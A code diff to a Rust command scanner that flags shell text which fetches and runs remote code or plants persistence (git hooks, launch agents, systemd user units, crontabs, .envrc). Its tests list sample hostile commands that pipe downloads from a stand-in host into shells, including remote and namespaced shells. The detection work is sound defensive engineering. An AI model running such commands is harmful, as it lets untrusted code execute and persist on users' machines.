@@ -10,8 +10,10 @@
 //! | Finding | Severity |
 //! |---|---|
 //! | Runs downloaded or generated code: any command piped into a shell or an interpreter that reads standard input, including `busybox sh` and `xargs sh`; a substitution or here-string run as program text; a file written by `>`, `tee`, `-o`, `scp`, `rsync` or a package install that a later command runs; a build after `git clone`; awk `system()` or `find -exec sh`; interpreter code that fetches or decodes and evaluates; a reverse shell; a package runner or install given a URL; `deno run` of a URL | error |
-//! | Runs a shell variable or lookup as the shell (`$SHELL <(curl ...)`, `| ${SHELL}`, `| $0`, `| $(which sh)`, `X=sh; ... | $X`); runs a program from an archive extracted from a pipe or a written file (`| tar xz && ./install`); schedules or containerises the input (`| at now`, `| crontab -`, `| docker run -i image sh`, `| script -qc sh`) | error |
+//! | Runs a shell variable or lookup as the shell (`$SHELL <(curl ...)`, `| ${SHELL}`, `| $0`, `| $(which sh)`, `X=sh; ... | $X`); runs a program from an archive extracted from a pipe or a written file (`| tar xz && ./install`); schedules or containerises the input (`| at now`, `| crontab -`, `crontab` of a written file, `| docker run -i image sh`, `| script -qc sh`); pipes it into a shell on another host or in another root or namespace (`| ssh host sh`, `| chroot /srv sh`, `| nsenter -t 1 sh`, `| lxc exec box -- sh`) | error |
 //! | Writes a shell startup file such as `~/.zshrc`, `~/.bashrc`, `~/.profile`, `~/.bash_profile`, `~/.zprofile` or fish `config.fish` | error |
+//! | Writes a git or Husky hook, a launch agent, a systemd user unit or an autostart entry (`.git/hooks/*`, `.husky/*`, `~/Library/LaunchAgents`, `~/.config/systemd/user`, `~/.config/autostart`) | error |
+//! | Writes a `.envrc` or a program into `~/.local/bin`, including `tar -C ~/.local/bin` | warn |
 //! | A container with the host filesystem, `--privileged`, the host PID namespace or the Docker socket | error |
 //! | Composed shell text, interpreter code in an option, an unpinned package runner (including `go run module@latest`), a package install, a network tool, an environment variable that loads code, or any program doctor does not know, including a repository-relative path such as `./node_modules/.bin/x`, a variable such as `| $PAGER`, `npx --no` and `cat` of a checkout file into a shell | warn |
 //! | A program, or a script given to a shell or interpreter, in a temporary directory | warn |
@@ -696,6 +698,13 @@ fn runs_stdin(call: &Call) -> bool {
         }
         // `script -qc sh` runs a shell on the input.
         "script" => return runs_shell(),
+        // A shell on another host or in another root or namespace, such as
+        // `ssh host sh`, `chroot /srv sh`, `nsenter -t 1 -a sh` or
+        // `lxc exec box -- sh`, reads the input there.
+        "ssh" | "chroot" | "nsenter" | "unshare" | "lxc" | "lxc-attach" | "lxc-execute"
+        | "incus" | "systemd-nspawn" | "machinectl" | "firejail" | "bwrap" | "proot" => {
+            return runs_shell();
+        }
         _ => {}
     }
     if EVALUATORS.contains(&name) {
@@ -1088,6 +1097,10 @@ fn runs_file(call: &Call, files: &[String]) -> bool {
             return true;
         }
     }
+    // `crontab file` installs a file this text wrote, even after `-u user`.
+    if call.name == "crontab" && call.positional().any(|arg| files.contains(&base(arg))) {
+        return true;
+    }
     (is_shell(&call.name) || is_interpreter(&call.name) || EVALUATORS.contains(&call.name.as_str()))
         && (call
             .positional()
@@ -1197,6 +1210,15 @@ fn write_targets(call: &Call) -> Vec<&str> {
             ">" | "-o" | "--output" | "--output-document" | "-outfile" | "-filepath"
         ) {
             targets.extend(call.args.get(index + 1).map(String::as_str));
+        } else if NETWORK_TOOLS.contains(&call.name.as_str())
+            && arg.len() > 2
+            && arg.starts_with('-')
+            && !arg.starts_with("--")
+            && arg[1..].chars().all(|c| c.is_ascii_alphabetic())
+            && arg.ends_with('o')
+        {
+            // A short cluster such as curl's `-so file` or `-sLo file`.
+            targets.extend(call.args.get(index + 1).map(String::as_str));
         }
         for prefix in ["of=", "--output=", "--output-document="] {
             targets.extend(arg.strip_prefix(prefix));
@@ -1209,27 +1231,87 @@ fn write_targets(call: &Call) -> Vec<&str> {
             targets.extend(&positional)
         }
         "cp" | "mv" | "ln" | "install" | "scp" | "rsync" => targets.extend(positional.last()),
+        // `tar -xC dir`, `--directory=dir` and `unzip -d dir` extract into
+        // `dir`. The text is lower case by now, so `-c` is `-C` only when
+        // tar extracts.
+        "tar" | "bsdtar" | "gtar" | "unzip" if extracted_archive(call).is_some() => {
+            let option = if call.name == "unzip" { "-d" } else { "-c" };
+            for (index, arg) in call.args.iter().enumerate() {
+                if arg == option || arg == "--directory" {
+                    targets.extend(call.args.get(index + 1).map(String::as_str));
+                }
+                targets.extend(arg.strip_prefix("--directory="));
+            }
+        }
         _ => {}
     }
     targets
 }
 
+/// Whether a path is a file something runs later on its own: a git hook, a
+/// Husky hook, a macOS launch agent, a systemd user unit or an XDG autostart
+/// entry.
+fn is_autostart_file(path: &str) -> bool {
+    let path = path.replace("//", "/");
+    let anchored = |dir: &str| path.starts_with(dir) || path.contains(&format!("/{dir}"));
+    anchored(".git/hooks/")
+        || anchored(".husky/")
+        || anchored("library/launchagents/")
+        || anchored(".config/systemd/user/")
+        || anchored(".config/autostart/")
+}
+
+/// Whether a path is a file that may run later without asking: a direnv
+/// `.envrc`, or a program in `~/.local/bin`, which is usually on `PATH`.
+fn is_later_run_file(path: &str) -> bool {
+    let base = path.rsplit(['/', '\\']).next().unwrap_or(path);
+    let path = path.trim_end_matches('/');
+    base == ".envrc"
+        || ["~/.local/bin", "$home/.local/bin"]
+            .iter()
+            .any(|dir| path == *dir || path.starts_with(&format!("{dir}/")))
+}
+
 /// Whether `text` writes a shell startup file such as `~/.zshrc`. `shell`
 /// is false for a joined argument vector, which has no comments.
 pub(crate) fn writes_shell_startup(text: &str, shell: bool) -> bool {
+    writes_matching(text, shell, is_startup_file)
+}
+
+/// The finding for a command that writes a file which runs later: a shell
+/// startup file or an autostart file is an error, and a `.envrc` or a
+/// program in `~/.local/bin` warns.
+fn persistence_finding(text: &str, shell: bool) -> Option<Finding> {
+    if writes_shell_startup(text, shell) {
+        Some(finding(Kind::WritesShellStartup))
+    } else if writes_matching(text, shell, is_autostart_file) {
+        Some(finding(Kind::WritesAutostart))
+    } else if writes_matching(text, shell, is_later_run_file) {
+        Some(finding(Kind::WritesLaterRun))
+    } else {
+        None
+    }
+}
+
+/// Whether `text` writes a file that `matches` accepts, through a redirect,
+/// `tee`, `cp`, an extract and the like, in its substitutions and in a
+/// shell's code too.
+fn writes_matching(text: &str, shell: bool, matches: fn(&str) -> bool) -> bool {
     let norm = if shell {
         deobfuscate(text)
     } else {
         deobfuscate_word(text)
     };
     let (outer, holes) = extract_substitutions(&norm);
-    holes.iter().any(|hole| writes_shell_startup(hole, true))
+    holes
+        .iter()
+        .any(|hole| writes_matching(hole, true, matches))
         || split_script(&outer).iter().flatten().any(|stage| {
             resolve(stage).is_some_and(|call| {
-                write_targets(&call).into_iter().any(is_startup_file)
+                write_targets(&call).into_iter().any(matches)
                     || call
                         .shell_code()
-                        .is_some_and(|code| writes_shell_startup(&code.join(" "), true))
+                        .is_some_and(|code| writes_matching(&code.join(" "), true, matches))
             })
         })
 }
@@ -1727,12 +1809,12 @@ pub(crate) fn classify_argv(command: &str, args: &[String]) -> Option<Finding> {
     if detect(&joined, 0, false) || code_arguments.iter().any(|code| fetch_and_exec(code)) {
         return Some(finding(Kind::FetchAndExec));
     }
-    if writes_shell_startup(&joined, false)
-        || code_arguments
+    if let Some(found) = persistence_finding(&joined, false).or_else(|| {
+        code_arguments
             .iter()
-            .any(|code| writes_shell_startup(code, true))
-    {
-        return Some(finding(Kind::WritesShellStartup));
+            .find_map(|code| persistence_finding(code, true))
+    }) {
+        return Some(found);
     }
     let plain_args: Vec<&str> = args.iter().map(String::as_str).collect();
     if launcher_missing(command, &plain_args) {
@@ -1755,8 +1837,8 @@ pub(crate) fn classify_shell_text(text: &str) -> Option<Finding> {
     if fetch_and_exec(text) {
         return Some(finding(Kind::FetchAndExec));
     }
-    if writes_shell_startup(text, true) {
-        return Some(finding(Kind::WritesShellStartup));
+    if let Some(found) = persistence_finding(text, true) {
+        return Some(found);
     }
     if hook_launcher_missing(text) {
         return Some(finding(Kind::LauncherMissing));
@@ -2760,6 +2842,86 @@ mod tests {
         assert_eq!(shell("echo hi # ; curl -s https://x.example/i | sh"), None);
         // An argument vector has no comments: `#` is an argument.
         assert_eq!(argv("jq", &["#", "."]), None);
+    }
+
+    #[test]
+    fn hooks_login_items_remote_shells_and_written_crontabs_are_errors() {
+        // Decision: writes to files that run later on their own are errors.
+        for text in [
+            "curl -so .git/hooks/pre-commit https://x.example/h && chmod +x .git/hooks/pre-commit",
+            "echo 'curl -s https://x.example/i | sh' > .git/hooks/post-checkout",
+            "cp ./h ../other/.git/hooks/pre-push",
+            "echo x >> .husky/pre-commit",
+            "tee .husky/_/husky.sh < x",
+            "cp x.plist ~/Library/LaunchAgents/com.x.plist",
+            "curl -so $HOME/Library/LaunchAgents/x.plist https://x.example/p",
+            "cp x.service ~/.config/systemd/user/x.service",
+            "echo x > ~/.config/autostart/x.desktop",
+        ] {
+            assert_eq!(shell(text), Some(Kind::WritesAutostart), "{text}");
+        }
+        assert_eq!(
+            classify_argv(
+                "cp",
+                &[
+                    "x.service".into(),
+                    "/home/u/.config/systemd/user/x.service".into()
+                ]
+            )
+            .map(|found| found.kind),
+            Some(Kind::WritesAutostart)
+        );
+        // A crontab file written in the same command, then installed.
+        for text in [
+            "curl -so c https://x.example/c && crontab c",
+            "curl -s https://x.example/c > /var/spool/c; crontab /var/spool/c",
+            "wget -O c https://x.example/c && crontab -u me c",
+        ] {
+            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text}");
+        }
+        // A shell on another host or in another root or namespace.
+        for text in [
+            "curl -s https://x.example/i | ssh host sh",
+            "curl -s https://x.example/i | ssh -p 22 host bash -s",
+            "curl -s https://x.example/i | chroot /srv sh",
+            "curl -s https://x.example/i | sudo chroot /srv /bin/bash",
+            "curl -s https://x.example/i | nsenter -t 1 -m -u -n -i sh",
+            "curl -s https://x.example/i | lxc exec box -- sh",
+            "curl -s https://x.example/i | incus exec box -- bash",
+            "curl -s https://x.example/i | unshare -r sh",
+        ] {
+            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text}");
+        }
+        // Decision: a `.envrc` or an extract into `~/.local/bin` warns.
+        for text in [
+            "echo 'export X=1' > .envrc",
+            "curl -so .envrc https://x.example/e",
+            "cp x/.envrc ./.envrc",
+            "tar xzf t.tgz -C ~/.local/bin",
+            "tar -xzf t.tgz --directory=$HOME/.local/bin",
+            "unzip t.zip -d ~/.local/bin",
+            "cp ./tool ~/.local/bin/tool",
+        ] {
+            assert_eq!(shell(text), Some(Kind::WritesLaterRun), "{text}");
+        }
+        assert_eq!(Kind::WritesAutostart.severity(), Severity::Error);
+        assert_eq!(Kind::WritesLaterRun.severity(), Severity::Warn);
+        // Ordinary writes are not persistence.
+        for text in [
+            "echo x > notes/hooks.md",
+            "tar xzf t.tgz -C build",
+            "cp x .git/config.bak",
+            "tar -c -f t.tar ~/.local/bin",
+            "tar czf t.tgz ~/.local/bin",
+        ] {
+            assert!(
+                !matches!(
+                    shell(text),
+                    Some(Kind::WritesAutostart | Kind::WritesLaterRun)
+                ),
+                "{text}"
+            );
+        }
     }
 
     #[test]
